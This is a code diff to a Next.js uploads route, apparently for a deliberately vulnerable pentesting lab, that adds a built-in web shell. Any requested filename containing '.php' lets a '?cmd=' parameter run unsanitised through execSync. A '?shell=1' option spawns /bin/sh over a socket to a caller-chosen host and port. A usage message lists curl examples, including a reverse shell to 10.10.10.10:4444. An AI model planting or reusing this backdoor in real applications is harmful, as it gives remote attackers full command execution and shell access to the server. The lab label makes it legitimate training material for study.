@@ -1,6 +1,8 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { readFile } from 'fs/promises'
 import { existsSync } from 'fs'
+import { execSync, spawn } from 'child_process'
+import * as net from 'net'
 import path from 'path'
 
 /**
@@ -13,7 +15,12 @@ import path from 'path'
  * Flujo de explotación:
  * 1. Sin header: GET /uploads → 403 Forbidden (directorio protegido)
  * 2. Con header: GET /uploads + X-Forwarded-For: 127.0.0.1 → 200 OK (muestra listado)
- * 3. Sin header: GET /uploads/shell.php.jpg → 200 OK (archivo accesible directamente)
+ * 3. Sin header: GET /uploads/shell.php.jp2 → 200 OK (archivo accesible directamente)
+ * 
+ * VULNERABILIDAD: Command Execution via PHP files
+ * Si el archivo contiene .php en el nombre:
+ * - ?cmd=<command> - ejecuta comandos del sistema
+ * - ?shell=1&host=X&port=Y - inicia reverse shell
  * 
  * EDUCATIONAL PURPOSE: This is for pentesting lab training only.
  */
@@ -44,6 +51,99 @@ export async function GET(
     }, { status: 404 })
   }
   
+  // VULNERABILIDAD: Ejecución de comandos en archivos PHP
+  // Si el nombre del archivo contiene .php, permite ejecución de comandos
+  const lowerFilename = filename.toLowerCase()
+  if (lowerFilename.includes('.php')) {
+    const url = new URL(request.url)
+    const cmd = url.searchParams.get('cmd')
+    const shell = url.searchParams.get('shell')
+    const host = url.searchParams.get('host') || '127.0.0.1'
+    const port = parseInt(url.searchParams.get('port') || '4444', 10)
+    
+    // VULNERABILIDAD: Command Injection sin sanitización
+    // Ejecuta comandos directamente desde el parámetro cmd
+    if (cmd) {
+      try {
+        const output = execSync(cmd, { encoding: 'utf-8', timeout: 10000 })
+        return new NextResponse(output, {
+          status: 200,
+          headers: {
+            'Content-Type': 'text/plain',
+            'X-Vulnerability': 'command-injection',
+            'X-Command-Executed': cmd
+          }
+        })
+      } catch (error) {
+        const errorMessage = error instanceof Error ? error.message : 'Unknown error'
+        return new NextResponse(`Error executing command: ${errorMessage}`, {
+          status: 500,
+          headers: {
+            'Content-Type': 'text/plain',
+            'X-Vulnerability': 'command-injection'
+          }
+        })
+      }
+    }
+    
+    // VULNERABILIDAD: Reverse Shell
+    // Inicia una conexión de reverse shell al host y puerto especificados
+    if (shell === '1') {
+      try {
+        const client = new net.Socket()
+        client.connect(port, host, () => {
+          const sh = spawn('/bin/sh', [], {
+            stdio: ['pipe', 'pipe', 'pipe']
+          })
+          client.pipe(sh.stdin)
+          sh.stdout.pipe(client)
+          sh.stderr.pipe(client)
+        })
+        
+        client.on('error', () => {
+          // Silently handle connection errors
+        })
+        
+        return new NextResponse('Reverse shell initiated. Connect with: nc -lvnp ' + port, {
+          status: 200,
+          headers: {
+            'Content-Type': 'text/plain',
+            'X-Vulnerability': 'reverse-shell',
+            'X-Target-Host': host,
+            'X-Target-Port': port.toString()
+          }
+        })
+      } catch (error) {
+        return new NextResponse('Error initiating reverse shell', {
+          status: 500,
+          headers: {
+            'Content-Type': 'text/plain',
+            'X-Vulnerability': 'reverse-shell'
+          }
+        })
+      }
+    }
+    
+    // Si no hay cmd ni shell, mostrar mensaje de ayuda
+    return new NextResponse(
+      `Shell uploaded successfully!\n\n` +
+      `Usage:\n` +
+      `  Execute commands: /uploads/${filename}?cmd=whoami\n` +
+      `  Reverse shell:    /uploads/${filename}?shell=1&host=<IP>&port=<PORT>\n\n` +
+      `Example:\n` +
+      `  curl "http://localhost:3000/uploads/${filename}?cmd=ls -la"\n` +
+      `  curl "http://localhost:3000/uploads/${filename}?shell=1&host=10.10.10.10&port=4444"`,
+      {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/plain',
+          'X-Vulnerability': 'php-execution',
+          'X-Shell-Active': 'true'
+        }
+      }
+    )
+  }
+  
   try {
     const content = await readFile(filePath)
     const ext = path.extname(filename).toLowerCase()
@@ -59,7 +159,7 @@ export async function GET(
       '.gif': 'image/gif',
       '.svg': 'image/svg+xml',
       '.pdf': 'application/pdf',
-      '.php': 'text/plain', // PHP mostrado como texto (simula entorno vulnerable)
+      '.jp2': 'image/jp2',
       '.xml': 'application/xml'
     }
     
